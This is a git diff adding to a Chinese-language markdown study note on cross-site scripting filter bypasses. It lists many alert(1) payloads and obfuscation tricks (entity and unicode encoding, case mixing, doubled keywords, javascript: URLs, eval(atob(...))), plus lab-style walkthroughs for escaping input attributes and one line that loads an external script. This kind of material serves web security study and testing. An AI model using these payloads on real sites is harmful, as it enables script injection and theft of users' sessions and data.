@@ -375,6 +375,8 @@ xss分为反射型、存储型、dom型。
 
 各种编码浏览器解码顺序为HTML解码 -> URL解码 -> js(unicode)解码HTML、js、进制编码  
 
+<img width="1030" height="260" alt="image" src="https://github.com/user-attachments/assets/795c55d4-3bda-487f-81b0-631cdb9d6113" />
+
 过滤标签属性函数  
 fuzz其他可用的标签属性函数  
 <a  
@@ -387,3 +389,156 @@ fuzz其他可用的标签属性函数
 <form  
 也可以自己构造html标签  
 
+大小写混合
+双写
+编码 比如将javascript中的t &#116;或者&#74;或者进行unicode编码,a编码为\u0061使用帽子的2版本进行转换最方便
+同义替换（如果过滤了on可以使用href配合javascript伪协议）
+脏数据（垃圾填充）
+
+javascript://
+javascript://%0aalert(1)
+
+:-> html编码 &#x3a
+<a href="javascript&#x3a;alert(1)//https://">test</a>
+<a href="javascrip&#x74;:alert(1)">
+
+最常见的方法  
+(alert)(1)  
+a=alert,a(1)  
+alert(String.fromCharCode(49))  
+[1].find(alert)  
+window['al'+'ert'](/xss/)  
+top["al"+"ert"](1)  
+top[/al/.source+/ert/.source](1)  
+aler\u0074(String.fr\u006fmCharC\u006fde(49))  
+al\u0065rt(1)  
+top['al\145rt'](1)  
+top[8680439..toString(30)](1)  
+eval(atob('YWxlcnQoMSk='))  
+"top['ale'+'rt'].call(null,'xss')"  
+al&#101;rt(2)   
+top['al\x65rt'](1)  
+[43804..toString(36)].some(confirm)  
+window['eval']("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029"  
+
+  #空白字符形式  
+  alert%20(/xss/)  
+  #回车换行  
+  alert%0a(/xss/)  
+  alert%0d(/xss/)  
+  #缩进  
+  alert%09(/xss/)  
+  #注释  
+  alert/*abcd*/(/xss/)  
+  #注释换行  
+  alert//abcd%0a(/xss/)  
+  alert//abcd%0d(/xss/)  
+  #括号分割  
+  (alert)(/xss/)  
+  ((alert))(/xss/)  
+window和top调用  
+  window.alert(0)  
+  window['al'+'ert'](0)  
+  top['al'+'ert'](0)  
+  top.alert(0)  
+
+垃圾填充  
+<script>  
+<script/123sad>  
+
+<input onfocus=\u0061\u006C\u0065\u0072\u0074(1) autofocus><a href=javascript:\u0061\u006C\u0065\u0072\u0074(1)>Click</a>  
+
+ 如果不是闭合,单双引号都被禁,使用不要引号的方法（<img src=x onerror=alert(1)>,<input onfocus=alert(1)>）
+
+单引号`'`被禁用双引号`"`  
+
+反引号  
+<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">  
+ 
+用斜杠`/`替换引号  
+alert(/xss/)  
+
+ 单引号 双引号 ' --> \'  
+ \'--> \\'  
+ 实现字符的逃逸  
+
+ 过滤（）  
+ 一般过滤的都是alert(1)这个整体想办法把他俩分开但是效果还是等效的  
+括号被过滤  
+<img src=1 onerror="window.onerror=eval;throw'=alert\x281\x29';">  
+
+根据服务器特性进行双写大小写编码之类的还可以引入外部的js地址  
+<svg/onload=s=createElement('script');body.appendChild(s);s.src='js地址'  
+
+ 后端过滤 \
+<\s\c\r\i\p\t\>\a\l\e\r\t\(\)\<\/\s\c\r\i\p\t\>\
+
+使用\转移'"的绕过方法  
+
+单引号 双引号 ' --> \'  
+ \'--> \\'  
+
+https://brutelogic.com.br/gym.php?p16=\"-alert(1)//  
+
+---
+
+ input 标签  
+ 啥都没过滤
+<input name=keyword  value="'"><123">
+payload:" onclick="javascript:alert(1)
+payload:" onclick="alert(1)
+payload: a"onfocus=alert(1)//
+payload:"><img src=x onerror=alert(1)>
+payload:" <img src=x onerror=alert(1)>
+
+过滤"<> -> 对这三个符号进行html编码的方式进行过滤
+?keyword=' onclick='javascript:alert(1)
+payload:' onclick='javascript:alert(1)
+
+过滤 <> -> 对这两个符号进行替换为空
+<input name=keyword  value="'"123">
+paylaod:" onclick="javascript:alert(1)
+
+"><'都没过滤就是打不通
+正常打payload之后搜索payload看是对什么进行了过滤
+<input name=keyword  value="" o_nclick="javascript:alert(1)">
+清楚的看到是对on进行了过滤
+既然on事件不能触发就得考虑闭合标签应用a参数的href属性
+<input name=keyword  value=""><a hr_ef='javascript:alert(1)'>">
+对href也进行了替换此时同意替换就不好用了考虑绕过
+直接大小写过"><a Href='javascript:alert(1)'>
+
+那就先进行事件的fuzz之后，再进行函数的fuzz
+<input name=keyword  value="'"><123">
+使用这个paylaod进行fuzz " onclick="javascript:alert(1) 先替换事件fuzz
+fuzz之后发现长度都一样
+再进行函数的替换发现长度也一样
+考虑替换另一种payload
+"><img src=x onerror=alert(1)>
+之后肯定也不是标签的
+发现共同点是都有on考虑过滤on所以直接换一种类型的payload
+payload:"><a href='javascript:alert(1)'>
+
+打入payload " onclick="javascript:alert(1)
+<input name=keyword  value="" click="java:alert(1)">
+" oonnclick="javascrscriptipt:alert(1)
+
+把我们的关键字替换为空考虑双写
+
+"闭合但是把双引号给过滤了
+<a href="'&quot<>123">
+
+但是我们再href里面或许我们不需要"直接使用javascript伪协议进行尝试
+javascript:alert(1)
+<center><BR><a href="javascr_ipt:alert(1)">
+很好进行了过滤尝试大小写过不了
+进行编码尝试
+十进制实体编码：javascrip&#116;:alert(1)
+十六进制实体编码：javascrip&#x74;:alert(1)本质也是html编码
+
+这个编码后html页面是不会变的所以直接点击看效果就行
+
+<input name=keyword  value="'&quot;&lt;&gt;123">
+
+ ---
+ 
